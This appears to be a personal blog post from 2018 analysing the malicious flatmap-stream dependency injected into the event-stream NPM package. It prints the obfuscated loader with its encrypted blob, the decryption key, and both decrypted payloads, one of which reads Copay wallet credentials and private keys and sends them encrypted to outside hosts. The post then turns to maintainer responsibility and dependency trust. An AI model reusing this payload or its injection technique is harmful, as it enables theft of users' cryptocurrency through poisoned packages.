---
title: "To Catch a Hacker - NPM Even Stream"
pubDate: 2018-12-14
---

(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)

A few weeks ago, [this](https://github.com/dominictarr/event-stream/issues/116) issue was opened on a popular Node NPM package called _Event Stream_. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM. The newly opened issue initially questioned a new, suspicious dependency that was pushed by a new, unknown maintainer. I was lucky enough to follow the community's investigation into this issue and now, I hope to present the findings here. My goal with this piece is to hopefully shed some light on how easy it is for somebody to inject malicious code into NPM packages, the responsibility of open source maintainers, and the responsibility of the community.

## The Malicious Code

A Github user noticed that a new dependency named _flatmap-stream_ was added to the event stream module. Through some investigative work, here is the raw code (un-minified by Github user [FallingSnow](https://github.com/FallingSnow)) that was injected through flatmap. The flatmap module was an unknown, single author module.

```javascript
// var r = require, t = process;

// function e(r) {
//     return Buffer.from(r, "hex").toString()
// }
function decode(data) {
    return Buffer.from(data, "hex").toString()
}

// var n = r(e("2e2f746573742f64617461")),
// var n = require(decode("2e2f746573742f64617461"))
// var n = require('./test/data')
var n = ["75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629","db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1","63727970746f","656e76","6e706d5f7061636b6167655f6465736372697074696f6e","616573323536","6372656174654465636970686572","5f636f6d70696c65","686578","75746638"]
    // o = t[e(n[3])][e(n[4])];
    // npm_package_description = process[decode(n[3])][decode(n[4])];
    // npm_package_description = process['env']['npm_package_description'];
    npm_package_description = 'Get all children of a pid'; // Description from ps-tree (this is the aes decryption key)

// if (!o) return;
if (!npm_package_description) return;

// var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
// var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),
var decipher = require('crypto')['createDecipher']('aes256', npm_package_description),

    // a = u.update(n[0], e(n[8]), e(n[9]));
    // decoded = decipher.update(n[0], e(n[8]), e(n[9]));
    decoded = decipher.update(n[0], 'hex', 'utf8');

console.log(n);

// a += u.final(e(n[9]));
decoded += decipher.final('utf8');

// var f = new module.constructor;
var newModule = new module.constructor;

/**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/
// f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
// newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1])
// newModule.paths = module.paths
// newModule['_compile'](decoded, "") // Module.prototype._compile = function(content, filename)
// newModule.exports(n[1])
```

As we can see, this is a fairly messy bit of code (as it had to be converted from mini-js to readable Node code). Also, the reader should note that there are some additional comments provided by FallingSnow, specifically the last bit. Caution! Do not run the last bit of code. You can simply use the above code to decrypt and see the injection attack. 

The biggest thing that tips us off to this being malicious is the long stream of encrypted characters that are latter decrypted and used in a `exports` statement, effectively "compiling" and running whatever is held in the encrypted block. Further, we can see that the `n` variable holds an array of 2 separate strings. And finally, in the last block, we can see that the decrypted string from the `n` variable is used with a '_compile' statement, effectively running whatever parsed JavaScript might be held within the string.

## Brute Force a Solution

Now, the key to deciphering the encrypted text depends directly on the `npm_package_description` variable, as we can see it is being used as the key in the `createDecipher` method. The initial thought from the community was that this key must be from the event stream `package.json` file itself (since the node runtime environment would set the modules description). However, this proved to not be the correct key and several Github users noted that it is possible to manually set a modules description from within the code. So, in order to find out what this injection attack is doing, we have to find the matching NPM package description. 

Eventually, the community was able to find a listing of all public NPM package descriptions and brute force a solution out of this long list of descriptions. Brute forcing the solution out of public NPM package descriptions was a clever way to eventually land on the right key. Since the variable name is descriptive enough, we can effectively narrow it down from an infinite number of possibilities to only strings that are NPM package descriptions. If the key's variable name hadn't been as pronounced, it would have been more challenge to find the key. The correct key is as follows and comes from the copay-dash NPM module:

```javascript
npm_package_description = 'A Secure Bitcoin Wallet';
```

Using this as the key, we can see the decrypted code is as follows, in the two seperate payloads:

```javascript
/*@@*/
module.exports = function(e) {
    try {
        if (!/build\:.*\-release/.test(process.argv[2])) return;
        var t = process.env.npm_package_description,
            r = require("fs"),
            i = "./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js",
            n = r.statSync(i),
            c = r.readFileSync(i, "utf8"),
            o = require("crypto").createDecipher("aes256", t),
            s = o.update(e, "hex", "utf8");
        s = "\n" + (s += o.final("utf8"));
        var a = c.indexOf("\n/*@@*/");
        0 <= a && (c = c.substr(0, a)), r.writeFileSync(i, c + s, "utf8"), r.utimesSync(i, n.atime, n.mtime), process.on("exit", function() {
            try {
                r.writeFileSync(i, c, "utf8"), r.utimesSync(i, n.atime, n.mtime)
            } catch (e) {}
        })
    } catch (e) {}
};
```

```javascript
/*@@*/ ! function() {
    function e() {
        try {
            var o = require("http"),
                a = require("crypto"),
                c = "-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----";

            function i(e, t, n) {
                e = Buffer.from(e, "hex").toString();
                var r = o.request({
                    hostname: e,
                    port: 8080,
                    method: "POST",
                    path: "/" + t,
                    headers: {
                        "Content-Length": n.length,
                        "Content-Type": "text/html"
                    }
                }, function() {});
                r.on("error", function(e) {}), r.write(n), r.end()
            }

            function r(e, t) {
                for (var n = "", r = 0; r < t.length; r += 200) {
                    var o = t.substr(r, 200);
                    n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
                }
                i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
            }

            function l(t, n) {
                if (window.cordova) try {
                    var e = cordova.file.dataDirectory;
                    resolveLocalFileSystemURL(e, function(e) {
                        e.getFile(t, {
                            create: !1
                        }, function(e) {
                            e.file(function(e) {
                                var t = new FileReader;
                                t.onloadend = function() {
                                    return n(JSON.parse(t.result))
                                }, t.onerror = function(e) {
                                    t.abort()
                                }, t.readAsText(e)
                            })
                        })
                    })
                } catch (e) {} else {
                    try {
                        var r = localStorage.getItem(t);
                        if (r) return n(JSON.parse(r))
                    } catch (e) {}
                    try {
                        chrome.storage.local.get(t, function(e) {
                            if (e) return n(JSON.parse(e[t]))
                        })
                    } catch (e) {}
                }
            }
            global.CSSMap = {}, l("profile", function(e) {
                for (var t in e.credentials) {
                    var n = e.credentials[t];
                    "livenet" == n.network && l("balanceCache-" + n.walletId, function(e) {
                        var t = this;
                        t.balance = parseFloat(e.balance.split(" ")[0]), "btc" == t.coin && t.balance < 100 || "bch" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r("c", JSON.stringify(t)))
                    }.bind(n))
                }
            });
            var e = require("bitcore-wallet-client/lib/credentials.js");
            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
                var t = this.getKeysFunc(e);
                try {
                    global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r("p", e + "\\t" + this.xPubKey))
                } catch (e) {}
                return t
            }
        } catch (e) {}
    }
    window.cordova ? document.addEventListener("deviceready", e) : e()
}();
```

A few things initially jump out. We can see that the injection code is targeting bitcoin, whether it's targeting vulnerable wallets or attempting to mine coins on remote hosts, it's difficult to decipher from this hacker's spaghetti code. Often times, malicious actors will attempt to make their code as difficult to read and understand as possible. JavaScript minifiers make this easier for them and it can be a real challenge to generate a readable file from minified, abstract code.

In short, the community was able to realize that these two code bits will search for vulnerable crypto-currency wallets, check for the copay NPM module, and attempt to steal the wallets and funds stored within them through the targeted module. Thankfully, this vulnerability is not as far reaching as people first thought it might be. An application must be running this malicious code, the copay dependency, and have a wallet with funds. 

## Aftermath

The people at NPM quickly took down the malicious version of event stream and the maintainers of the copay module put up a warning about the vulnerability. Unfortunately, the malicious code was not realized for almost 2 months. The last commit to the event stream repository was around September 20th, 2018 and the Github issue that started this was not opened until November 20th, 2018. There's no real way to know how many people were negatively affected by this but it's clear that this vulnerability reached millions of people running the event stream module through some node dependency. 

## Community Standards

This event triggered a huge backlash from the community. Why was this hacker given maintainer credentials and allowed to have publishing access to the module? Why were the countless other community members not aware of his commits? Who bares the responsibility for this open source project?

Per the open source license provided in the module, we see the following: 'THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND'. Dose this absolve the original creator for his mistake? Dose the sole responsibility lay with the user of the software, regardless of its state? Unfortunately, this leaves many unanswered questions.

## Should I Trust You?

I think it's important to recognize the larger issue here; NPM modules are too easily trusted. I don't know how many times I've looked online for something, found a package, downloaded it, and used it within my project without question. For all I know, I could be putting my users at risk of some attack by using a malicious dependency. NPM is an amazing tool, but it's important to realize that vulnerabilities exist. Here are some tips for safe NPM package usage:

1. Is the package open source?
2. Is the package maintained by a community? 
3. Is the community currently active? 
4. How can I contribute to maintain this open source project?

By involving yourself in the open source projects that you use, you can become a vigilant member of the community that protects and maintains open source software. Solo hero developers are far and few between, so don't depend on them. Get involved, be apart of the open source community, and contribute to the projects that you use.

---

If you found this blog post valuable,
consider [subscribing to future posts via RSS](https://johncodes.com/index.xml)
or [buying me a coffee via GitHub sponsors.](https://github.com/sponsors/jpmcb)
